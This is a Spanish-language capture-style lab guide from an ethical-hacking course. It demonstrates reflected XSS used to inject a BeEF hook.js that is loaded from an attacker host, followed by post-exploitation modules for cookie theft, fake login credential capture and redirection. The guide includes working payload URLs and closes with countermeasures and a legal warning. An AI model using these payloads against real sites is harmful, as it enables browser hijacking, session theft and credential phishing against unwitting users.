# 🎯 LAB 04: BeEF XSS Hooking - Explotación del Navegador

> **Módulo 04 - Cisco Ethical Hacker | Dificultad: ⭐⭐⭐⭐ Alta**

---

## 🎯 Objetivos de Aprendizaje
- Explotar una vulnerabilidad **XSS Reflejado** para inyectar el hook de BeEF.
- Controlar remotamente un navegador "enganchado" desde el panel de BeEF.
- Ejecutar módulos de post-explotación: fingerprinting, robo de cookies, ingeniería social.
- Comprender la cadena de ataque XSS → BeEF → Exfiltración de datos.

---

## 🐳 Infraestructura Docker

**📁 Ubicación:** `04_Ataques_Ingenieria_social/infraestructura/lab_beef_xss/`

### Arquitectura del Lab

```
┌──────────────────────────────────────────────────────────────┐
│                  Red: 172.32.0.0/24                          │
│                                                              │
│  ┌────────────────────┐    ┌────────────────────┐           │
│  │  🔴 ATACANTE       │    │  🟡 SITIO VULNERABLE│          │
│  │  Kali + BeEF       │    │  Pixel Paradise     │          │
│  │  172.32.0.10       │    │  172.32.0.20        │          │
│  │                    │    │  XSS Reflejado      │          │
│  │  Panel BeEF:       │    │  :8083 (navegador)  │          │
│  │  :3000/ui/panel    │    │                     │          │
│  └────────┬───────────┘    └──────────┬──────────┘          │
│           │                           │                      │
│           │    hook.js ←──────────────┘                      │
│           │    (XSS inyecta el script)                       │
│           │                                                  │
│  ┌────────▼──────────────────────────────────────┐          │
│  │  👤 VÍCTIMA (navegador en el host)            │          │
│  │  Visita URL maliciosa con payload XSS         │          │
│  │  → Navegador enganchado → Control total       │          │
│  └───────────────────────────────────────────────┘          │
└──────────────────────────────────────────────────────────────┘
```

### Despliegue
```bash
cd 04_Ataques_Ingenieria_social/infraestructura/lab_beef_xss/
docker compose up -d
```

### Verificación
```bash
# El sitio vulnerable debe ser accesible:
curl -s http://localhost:8083 | head -5

# Acceder al atacante:
docker exec -it lab_beef_atacante bash
```

---

## 👨‍💻 Escenario

Has descubierto que el portal interno de **Pixel Paradise** tiene una vulnerabilidad **XSS Reflejado** en su buzón de sugerencias. Como pentester, debes demostrar que esta vulnerabilidad permite a un atacante tomar el control completo del navegador de cualquier empleado que haga clic en un enlace malicioso.

**Cadena de ataque:**
```
XSS Reflejado → Inyección de hook.js → BeEF controla el navegador
→ Fingerprinting → Robo de cookies → Ingeniería social → Exfiltración
```

---

## 🚀 Fase 1: Identificación de la Vulnerabilidad XSS

### Paso 1: Probar XSS básico
Abre tu navegador y visita el sitio vulnerable:
```
http://localhost:8083
```

### Paso 2: Inyectar un payload XSS de prueba
En el campo "Buzón de Sugerencias", escribe:
```html
<script>alert('XSS!')</script>
```

O directamente en la URL:
```
http://localhost:8083/?msg=<script>alert('XSS!')</script>
```

> **¿Apareció un alert?** Entonces el sitio es vulnerable a XSS Reflejado. El input del usuario se renderiza directamente en el HTML sin sanitizar.

### Paso 3: Verificar en el código fuente
```bash
docker exec lab_beef_target cat /var/www/html/index.php | grep -A 3 "GET\['msg'\]"
```
> El `echo $_GET['msg']` sin `htmlspecialchars()` es la causa raíz.

---

## 🚀 Fase 2: Configuración de BeEF

### Paso 1: Acceder al contenedor atacante
```bash
docker exec -it lab_beef_atacante bash
```

### Paso 2: Configurar BeEF
Antes de iniciar BeEF, configura la contraseña:
```bash
# Editar la configuración de BeEF
sed -i 's/passwd: "beef"/passwd: "beef123"/' /usr/share/beef-xss/config.yaml 2>/dev/null
# Si el archivo está en otra ruta:
find / -name "config.yaml" -path "*/beef*" 2>/dev/null
```

### Paso 3: Iniciar BeEF
```bash
cd /usr/share/beef-xss && ./beef 2>&1 &
# O simplemente:
beef-xss &
```

Espera a que muestre:
```
[*] BeEF server started (might take a while to load modules)
[*]    Web UI:      http://0.0.0.0:3000/ui/panel
[*]    Hook:        <script src="http://<IP>:3000/hook.js"></script>
```

### Paso 4: Acceder al panel de BeEF
Desde tu navegador en el host:
```
http://localhost:3000/ui/panel
```
- **Usuario:** `beef`
- **Contraseña:** `beef123`

---

## 🚀 Fase 3: Hooking - Enganchar el Navegador de la Víctima

### Método A: Inyección vía XSS Reflejado (el más realista)

Construye la URL maliciosa:
```
http://localhost:8083/?msg=<script src="http://172.32.0.10:3000/hook.js"></script>
```

> En un ataque real, esta URL se enviaría por email o chat a la víctima, camuflada con un acortador de URLs.

### Método B: Inyección directa en el código (para practicar)

Edita el archivo del sitio vulnerable y descomenta la línea del hook:
```bash
# En el host:
nano 04_Ataques_Ingenieria_social/infraestructura/lab_beef_xss/target_site_hooked/index.php
```
Busca la línea comentada y descoméntala:
```html
<!-- Descomenta esta línea: -->
<script src="http://172.32.0.10:3000/hook.js"></script>
```

### Paso de verificación: Abrir el sitio como "víctima"
1. Abre una nueva ventana/pestaña en tu navegador.
2. Abre la URL (Método A o simplemente `http://localhost:8083` si usaste Método B).
3. Vuelve al panel de BeEF.
4. **¿Ves un nuevo navegador en "Online Browsers"?** ¡Estás dentro! 🎯

---

## 🚀 Fase 4: Post-Explotación con Módulos de BeEF

### Ejercicio 4.1: Fingerprinting del Navegador
1. En el panel de BeEF, selecciona el navegador enganchado.
2. Ve a la pestaña **Commands**.
3. Busca: **Browser → Fingerprinting**.
4. Haz clic en **Execute**.

**Datos que obtendrás:**
- Sistema operativo y versión
- Nombre y versión del navegador
- Plugins instalados
- Resolución de pantalla
- Zona horaria

> **Pregunta:** ¿Por qué es valioso un fingerprint para un atacante?
> *Respuesta:* Permite seleccionar exploits específicos para la versión exacta del navegador/OS.

### Ejercicio 4.2: Robo de Cookies
1. Busca: **Browser → Get Cookie**.
2. Ejecuta el módulo.
3. Revisa el resultado en la pestaña **Module Results**.

```
cookie: PHPSESSID=abc123def456; user_pref=dark_mode
```

> **Impacto:** Con la cookie de sesión, un atacante puede secuestrar la sesión del usuario (*Session Hijacking*).

### Ejercicio 4.3: Ingeniería Social - Fake Notification
1. Busca: **Social Engineering → Fake Notification (Bar)**.
2. Configura:
   - **Notification text:** `Su sesión ha expirado. Haga clic aquí para reconectarse.`
   - **URL de redirección:** `http://172.32.0.10:3000/demos/basic.html`
3. Ejecuta y observa la barra que aparece en el navegador de la víctima.

### Ejercicio 4.4: Pretty Theft (Diálogo de Login Falso)
1. Busca: **Social Engineering → Pretty Theft**.
2. Configura:
   - **Dialog type:** `Facebook` (o `LinkedIn`, `Windows`, `Generic`).
3. Ejecuta.
4. En la pestaña de la víctima verás un diálogo de login superpuesto.
5. Introduce credenciales de prueba y verifica que aparecen en el panel de BeEF.

### Ejercicio 4.5: Geolocalización
1. Busca: **Host → Get Geolocation (Third Party)**.
2. Ejecuta.
3. BeEF intentará obtener la ubicación del navegador (requiere que la víctima acepte permisos).

---

## 🚀 Fase 5: Combinación de Ataques (Cadena Completa)

Ahora que dominas los módulos individuales, vamos a encadenarlos como haría un atacante real:

### Cadena de Ataque:
```
1. XSS Reflejado → hook.js inyectado
2. Fingerprinting → conocemos el navegador y OS
3. Get Cookie → robamos la sesión
4. Pretty Theft → capturamos credenciales
5. Redirect Browser → enviamos a la víctima a donde queramos
```

**Ejecuta los 5 pasos en orden y documenta los resultados de cada uno.**

---

## 📊 Tabla de Módulos Clave de BeEF

| Módulo | Categoría | Color | Efecto |
|:---|:---|:---|:---|
| Fingerprinting | Browser | 🟢 Verde | Info del navegador/OS |
| Get Cookie | Browser | 🟢 Verde | Robo de cookies |
| Fake Notification | Social Eng. | 🟠 Naranja | Barra engañosa |
| Pretty Theft | Social Eng. | 🟠 Naranja | Login falso overlay |
| Redirect Browser | Browser | 🟢 Verde | Redirige a URL |
| Get Geolocation | Host | 🟠 Naranja | Ubicación GPS |
| Webcam | Host | 🔴 Rojo | Acceso a cámara |

---

## 🧠 Reflexión del Mentor

**¿Por qué un simple XSS puede ser tan devastador?**

> **Respuesta:** Porque una vez que inyectas `hook.js`, el navegador se convierte en una **puerta trasera permanente** mientras la pestaña esté abierta. El atacante puede:
> 1. **Ver** todo lo que hace el usuario en esa pestaña.
> 2. **Inyectar** formularios falsos para robar credenciales.
> 3. **Redirigir** al usuario a sitios de malware.
> 4. **Escanear** la red interna del usuario.
> 5. **Pivotear** hacia otros servicios de la intranet.
>
> Por eso XSS es consistentemente una de las **Top 10 vulnerabilidades de OWASP**.

---

## 🛡️ Contramedidas

| Capa | Medida | Efecto |
|:---|:---|:---|
| **Código** | `htmlspecialchars($_GET['msg'])` | Neutraliza el XSS |
| **HTTP** | Header `Content-Security-Policy` | Bloquea scripts de origen externo |
| **HTTP** | Header `X-XSS-Protection: 1; mode=block` | Filtro XSS del navegador |
| **Cookies** | Flag `HttpOnly` | Impide el acceso JS a las cookies |
| **Cookies** | Flag `Secure` | Solo envía cookies por HTTPS |
| **Red** | WAF (Web Application Firewall) | Filtra payloads XSS conocidos |

---

## 🛡️ Checklist de Verificación

- [ ] ¿He confirmado la vulnerabilidad XSS con un `alert()`?
- [ ] ¿He iniciado BeEF y accedido al panel?
- [ ] ¿He enganchado un navegador con el hook.js?
- [ ] ¿He ejecutado al menos 3 módulos de post-explotación?
- [ ] ¿He completado la cadena de ataque completa?
- [ ] ¿He documentado las contramedidas en mi informe?

---

## 🧹 Limpieza
```bash
cd 04_Ataques_Ingenieria_social/infraestructura/lab_beef_xss/
docker compose down
```

---

> [!WARNING]
> **Advertencia Legal:** BeEF y la explotación XSS fuera de laboratorios controlados y sin autorización expresa es ilegal bajo la legislación de cibercrimen vigente. Este lab es estrictamente educativo.

---
*Módulo 04 - Cisco Ethical Hacker*
